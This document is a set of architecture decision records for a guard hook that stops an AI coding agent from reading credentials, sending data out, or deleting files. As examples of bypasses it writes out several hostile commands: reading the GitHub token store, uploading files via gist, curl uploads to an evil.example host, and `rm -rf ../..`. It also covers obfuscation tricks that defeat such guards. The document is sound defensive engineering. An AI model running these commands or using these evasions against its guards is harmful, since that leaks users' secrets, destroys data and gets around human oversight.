# Architecture Decision Records (ADRs)

Short notes on the design decisions behind this tool, one per real problem I hit.
The tests enforce these; this is the reasoning.

## 1. The two holes I was sure I'd covered

The first version blocked the obvious secret files: `~/.ssh`, `~/.aws`, `.env`.
Then I had someone try to break it, and the two most valuable stores turned out to
be wide open. `cat ~/.config/gh/hosts.yml` printed my GitHub token, and
`gh gist create <file>` would upload anything I pointed it at, and neither tripped
a single check. The credential-path list didn't know about the GitHub token store,
and a gist upload isn't a "read a secret file" shape at all, it's a network command
wearing an ordinary name.

So the secret-path list now includes the two stores an AI coding agent is most
likely to reach (the GitHub token store and the Claude credentials file), and the
`gh` subcommands that ship data (gist, release upload, a writing api call) are
handled in the network lock, not the file lock.

The lesson stuck: the holes that matter aren't the ones you thought of, they're the
ones an adversary finds. A guard is only as good as the review that tried to beat it.

## 2. A user-agent string is not a destination

The network lock allows a command if it points at a local address. An early version
looked for "localhost" anywhere in the command. That let
`curl -A localhost https://evil.example/upload` straight through: `-A` sets a
user-agent header, and the word "localhost" sitting in that header satisfied a check
that was supposed to describe where the data goes.

So now it pulls the actual host out of the URL and checks only that. A local-sounding
word somewhere else in the command doesn't count.

Small bug, but it's the exact shape of a bypass: satisfy the letter of a check with
something that has nothing to do with its intent. Check the thing you actually care
about, not a stand-in for it.

## 3. Fail open, and never let the agent override

Two decisions that sound backwards until you've run agents in production.

It fails open. A malformed payload, a missing `jq`, any error at all, and the command
is allowed. A guard that blocks everything the moment it breaks is a guard that gets
ripped out the first time it wedges a session. This is a cheap early layer, not the
last line of defense, so a false "allow" when it's broken beats a false "deny" on
everything.

And there's no agent override. Some hooks let the model pass a flag to bypass them;
this one can't be talked out of a block. If a command is legitimately blocked, a
person runs it outside the agent. An override the agent controls is an override a
poisoned instruction controls.

The honest limit, stated plainly: this is porous against deliberate obfuscation
(`base64`, `eval`, hiding a path in a variable). It stops honest mistakes and obvious
attacks cheaply. The real wall for a determined adversary is an OS-level sandbox; this
rides in front of one, not instead of it.

## 4. Fixing the false positives opened three new holes

A second review put about sixty commands through the guard that the suite never tested.
The verdict was that the architecture held and the pattern matching was where the work
was, which turned out to be exactly right, and not in the way I expected.

The guard blocked `cat docs/design-tokens.md`. Design tokens are a universal frontend
convention, so anyone doing interface work hits that within an hour, and a guard that
blocks a designer's own file every morning gets uninstalled by lunch. It also blocked
`curl --help`, `grep -rn curl scripts/`, and a local-to-local `rsync`, none of which
touch a network. Meanwhile `rm -rf ../..` sailed straight through, and that is the
likeliest real havoc there is, because an agent runs with its working directory inside
your repo and needs no absolute path to destroy it.

Fixing all of that took three changes: a benign tier underneath the credential words,
command-position matching for the network binaries, and resolving relative paths in the
destruction lock. Every one of those fixes was correct. Three of them also opened a new
hole, and the suite went green over all three.

The local-destination allow-list had already been anchored to the parsed URL host
rather than the whole command, which was the fix for an earlier incident where
`curl -A localhost https://evil.example` passed because a user-agent string satisfied a
check about where data goes. The host test itself was still a substring match, so
`localhost.evil.example` passed too. The same bug, one layer down, and the change that
finally made `.local` hosts work was the change that removed the last anchoring. The
list is now exact for the literals and dot-bounded for the suffixes.

Splitting a command into segments on braces shattered a JSON request body and left the
URL in a segment with no command in front of it, so `curl -d '{"tok":"..."}' https://x`
had nothing to judge, while the same request written with an explicit `-X POST` blocked.
Braces never needed splitting. A `{ cmd; }` group always carries a separator that splits
already.

The benign tier yielded on `.txt`, `.sh` and `.sql` anywhere, which are precisely the
shapes a naive credential file takes, so the new version was weaker than the old one on
`cat ~/api_token.txt`. Those extensions now yield only under a repo-relative source
directory, because `app/` and `src/` also appear inside paths like `/opt/app/`.

The lesson is about sequence rather than regex. The tests were written after the code,
so they could only encode the blind spots already known, and a suite can be green over
a hole its author never thought to look for. The sixty-command corpus that found these
is now part of the suite, and it goes first next time.
